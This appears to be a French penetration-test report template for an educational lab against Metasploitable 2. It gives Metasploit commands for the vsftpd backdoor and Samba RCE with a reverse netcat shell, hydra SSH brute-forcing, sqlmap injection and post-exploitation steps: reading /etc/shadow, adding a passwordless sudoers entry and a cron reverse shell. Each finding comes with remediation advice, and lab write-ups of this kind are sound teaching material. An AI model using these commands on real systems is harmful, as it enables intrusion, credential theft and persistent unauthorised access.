# 📝 Rapport de Test de Pénétration - Lab de Cybersécurité

---

## 📊 Informations Générales

| **Champ** | **Détail** |
|-----------|---------------|
| **Date du test** | 2025-01-15 |
| **Testeur** | [Votre nom] |
| **Cible** | Metasploitable 2 (192.168.100.20) |
| **Scope** | Réseau 192.168.100.0/24 |
| **Durée** | 4 heures |
| **Type de test** | Black Box / Grey Box / White Box |

---

## 📜 1. Résumé Exécutif

### Objectif du test
Ce rapport présente les résultats d'un test de pénétration réalisé sur la machine **Metasploitable 2** dans un environnement de laboratoire éducatif. L'objectif était d'identifier les vulnérabilités présentes et de démontrer leur exploitation.

### Résultats clés
- **Vulnérabilités critiques identifiées** : 5
- **Vulnérabilités élevées** : 8
- **Vulnérabilités moyennes** : 12
- **Accès root obtenu** : ✓ Oui
- **Temps pour l'accès root** : 45 minutes

### Recommandations principales
1. Désactiver les services inutiles (FTP, Telnet)
2. Mettre à jour tous les services vers les dernières versions
3. Appliquer des politiques de mots de passe robustes
4. Configurer un pare-feu restrictif
5. Implémenter une segmentation réseau

---

## 🛡️ 2. Méthodologie

### Framework utilisé
- **OWASP Testing Guide**
- **PTES (Penetration Testing Execution Standard)**
- **MITRE ATT&CK Framework**

### Phases du test

1. **Reconnaissance** : Collecte d'informations sur la cible
2. **Scan et énumération** : Identification des services et vulnérabilités
3. **Exploitation** : Tentative d'exploitation des failles identifiées
4. **Post-exploitation** : Maintien d'accès et escalade de privilèges
5. **Rapport** : Documentation des findings

### Outils utilisés
- Nmap (scan de ports)
- Metasploit Framework (exploitation)
- Hydra (brute-force)
- Nikto (scan web)
- Burp Suite (analyse web)
- Wireshark (analyse réseau)

---

## 🔍 3. Reconnaissance

### 3.1 Découverte de l'hôte

**Commande** :
```bash
nmap -sn 192.168.100.0/24
```

**Résultat** :
```
Host is up (0.00043s latency).
MAC Address: 08:00:27:A5:B4:C3 (Oracle VirtualBox)
```

### 3.2 Scan de ports

**Commande** :
```bash
nmap -sS -sV -A -p- -T4 192.168.100.20 -oA metasploitable_scan
```

**Résultat** :
| **Port** | **État** | **Service** | **Version** |
|----------|-----------|-------------|-------------|
| 21/tcp | open | ftp | vsftpd 2.3.4 |
| 22/tcp | open | ssh | OpenSSH 4.7p1 |
| 23/tcp | open | telnet | Linux telnetd |
| 80/tcp | open | http | Apache 2.2.8 |
| 139/tcp | open | netbios-ssn | Samba 3.0.20 |
| 445/tcp | open | microsoft-ds | Samba 3.0.20 |
| 3306/tcp | open | mysql | MySQL 5.0.51a |
| 5432/tcp | open | postgresql | PostgreSQL 8.3 |
| 8180/tcp | open | http | Apache Tomcat 5.5 |

### 3.3 Énumération des services

#### FTP (Port 21)
```bash
nmap -sV --script ftp-anon 192.168.100.20 -p 21
```
**Résultat** : FTP anonyme activé ✓

#### SSH (Port 22)
```bash
ssh root@192.168.100.20
```
**Résultat** : PermitRootLogin activé

#### SMB (Ports 139, 445)
```bash
enum4linux -a 192.168.100.20
```
**Résultat** : 
- Workgroup: WORKGROUP
- Samba 3.0.20 (vulnérable)
- Partages accessibles sans authentification

---

## 🚨 4. Vulnérabilités Identifiées

### 4.1 Vulnérabilité #1 : vsftpd 2.3.4 Backdoor

| **Attribut** | **Valeur** |
|--------------|------------|
| **Sévérité** | 🔴 **CRITIQUE** |
| **CVSS Score** | 10.0 |
| **CVE** | CVE-2011-2523 |
| **Service** | FTP (port 21) |
| **MITRE ATT&CK** | T1190 - Exploit Public-Facing Application |

**Description** :
La version 2.3.4 de vsftpd contient une backdoor malveillante qui permet d'obtenir un shell root directement en envoyant une séquence spécifique lors de l'authentification.

**Preuve de concept** :
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.20
exploit
```

**Résultat** :
```
[*] Banner: 220 (vsFTPd 2.3.4)
[*] Command shell session 1 opened
[*] uid=0(root) gid=0(root)
```

**Impact** :
- Accès root complet au système
- Exécution de code arbitraire
- Compromission totale de la machine

**Recommandation** :
1. Mettre à jour vsftpd vers la version 3.x
2. Désactiver le service FTP si non nécessaire
3. Utiliser SFTP à la place
4. Implémenter un IDS/IPS

---

### 4.2 Vulnérabilité #2 : Samba "username map script" RCE

| **Attribut** | **Valeur** |
|--------------|------------|
| **Sévérité** | 🔴 **CRITIQUE** |
| **CVSS Score** | 9.8 |
| **CVE** | CVE-2007-2447 |
| **Service** | SMB (port 445) |
| **MITRE ATT&CK** | T1210 - Exploitation of Remote Services |

**Description** :
Samba 3.0.20 permet l'exécution de commandes shell via le paramètre "username" lors de l'authentification.

**Preuve de concept** :
```bash
use exploit/multi/samba/usermap_script
set RHOST 192.168.100.20
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.100.10
exploit
```

**Résultat** :
```
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Command shell session 2 opened
uid=0(root) gid=0(root)
```

**Impact** :
- Exécution de code arbitraire avec privilèges root
- Compromission complète du serveur

**Recommandation** :
1. Mettre à jour Samba vers la version 4.x
2. Désactiver le paramètre "username map script"
3. Filtrer les ports SMB au niveau du pare-feu

---

### 4.3 Vulnérabilité #3 : Mots de passe faibles

| **Attribut** | **Valeur** |
|--------------|------------|
| **Sévérité** | 🟠 **ÉLEVÉE** |
| **Service** | SSH (port 22) |
| **MITRE ATT&CK** | T1110.001 - Brute Force: Password Guessing |

**Description** :
Plusieurs comptes utilisateur ont des mots de passe faibles ou par défaut.

**Preuve de concept** :
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20
```

**Comptes compromis** :
- `msfadmin:msfadmin`
- `user:password`
- `postgres:postgres`
- `service:service`

**Impact** :
- Accès non autorisé aux comptes utilisateurs
- Possibilité d'escalade de privilèges

**Recommandation** :
1. Implémenter une politique de mots de passe robustes
2. Activer l'authentification par clé SSH
3. Désactiver l'authentification par mot de passe
4. Implémenter un verrouillage après échecs de connexion

---

### 4.4 Vulnérabilité #4 : Injection SQL sur l'application web

| **Attribut** | **Valeur** |
|--------------|------------|
| **Sévérité** | 🟠 **ÉLEVÉE** |
| **CVSS Score** | 8.6 |
| **Service** | HTTP (port 80) |
| **MITRE ATT&CK** | T1190 - Exploit Public-Facing Application |

**Description** :
L'application web (Mutillidae) est vulnérable à l'injection SQL.

**Preuve de concept** :
```bash
sqlmap -u "http://192.168.100.20/mutillidae/index.php?page=user-info.php&username=test" --dbs
```

**Résultat** :
```
available databases [5]:
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
```

**Impact** :
- Extraction de données sensibles
- Modification de la base de données
- Possibilité d'obtenir un shell via SQL injection

**Recommandation** :
1. Utiliser des requêtes préparées (prepared statements)
2. Valider et assainir toutes les entrées utilisateur
3. Implémenter un WAF (Web Application Firewall)
4. Appliquer le principe du moindre privilège pour les comptes DB

---

### 4.5 Résumé des vulnérabilités

| **Sévérité** | **Nombre** | **Pourcentage** |
|----------------|------------|------------------|
| 🔴 Critique | 5 | 20% |
| 🟠 Élevée | 8 | 32% |
| 🟡 Moyenne | 12 | 48% |
| **Total** | **25** | **100%** |

---

## 🛠️ 5. Exploitation

### Scénario d'attaque complet

#### Étape 1 : Reconnaissance
```bash
nmap -sS -sV -A 192.168.100.20
```

#### Étape 2 : Exploitation vsftpd backdoor
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.20
exploit
```

#### Étape 3 : Obtention d'un shell stable
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### Étape 4 : Enumération post-exploitation
```bash
id
uname -a
cat /etc/passwd
cat /etc/shadow
```

#### Étape 5 : Persistence
```bash
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
crontab -e  # Ajouter un reverse shell
```

---

## 🔓 6. Post-exploitation

### Privilèges obtenus
- **Utilisateur** : root
- **UID** : 0
- **Groupe** : root (0)

### Données sensibles récupérées
- Fichier `/etc/shadow` (hashes des mots de passe)
- Base de données MySQL complète
- Clés SSH privées
- Historique des commandes (`.bash_history`)

### Persistence établie
- Création d'un compte backdoor
- Ajout d'une tâche cron pour reverse shell
- Modification de `/etc/rc.local`

---

## 🛡️ 7. Recommandations

### Priorité 🔴 Critique
1. **Mettre à jour tous les services** immédiatement
   - vsftpd vers 3.x
   - Samba vers 4.x
   - Apache vers 2.4.x
   - MySQL vers 8.x

2. **Désactiver les services inutiles**
   - Telnet (utiliser SSH uniquement)
   - FTP (utiliser SFTP)
   - Services non essentiels

3. **Implémenter un pare-feu**
   ```bash
   ufw enable
   ufw default deny incoming
   ufw allow 22/tcp
   ufw allow 80/tcp
   ufw allow 443/tcp
   ```

### Priorité 🟠 Élevée
4. **Politique de mots de passe robustes**
   - Minimum 12 caractères
   - Caractères spéciaux obligatoires
   - Expiration tous les 90 jours

5. **Authentification SSH par clé**
   ```bash
   sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
   sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
   ```

6. **Sécuriser les applications web**
   - Utiliser prepared statements
   - Implémenter un WAF
   - Activer HTTPS

### Priorité 🟡 Moyenne
7. **Monitoring et logs**
   - Implémenter un SIEM
   - Activer l'audit logging
   - Configurer des alertes

8. **Segmentation réseau**
   - Séparer les serveurs publics des serveurs internes
   - Implémenter des VLANs

---

## 📊 8. Conclusion

### Résumé
Le test de pénétration a révélé **25 vulnérabilités** dont **5 critiques** permettant une compromission totale du système. L'accès root a été obtenu en moins de 45 minutes via plusieurs vecteurs d'attaque.

### Niveau de risque global
🔴 **CRITIQUE** - Action immédiate requise

### Prochaines étapes
1. Appliquer les correctifs pour les vulnérabilités critiques
2. Implémenter les recommandations de sécurité
3. Effectuer un nouveau test dans 30 jours
4. Former les équipes sur les bonnes pratiques de sécurité

### Contact
Pour toute question concernant ce rapport :
- **Email** : security@lab.local
- **Téléphone** : +33 X XX XX XX XX

---

## 📎 Annexes

### Annexe A : Mapping MITRE ATT&CK
| **Technique** | **ID** | **Utilisé** |
|---------------|--------|------------|
| Exploit Public-Facing Application | T1190 | ✓ |
| Brute Force | T1110 | ✓ |
| Exploitation of Remote Services | T1210 | ✓ |
| Valid Accounts | T1078 | ✓ |
| Create Account | T1136 | ✓ |

### Annexe B : Commandes utilisées
Voir fichier séparé : `commandes_essentielles.md`

### Annexe C : Captures d'écran
- Screenshot 1 : Résultats Nmap
- Screenshot 2 : Exploitation Metasploit
- Screenshot 3 : Shell root obtenu

---

**Rapport généré le** : 2025-01-15  
**Version** : 1.0  
**Confidentialité** : Strictement confidentiel
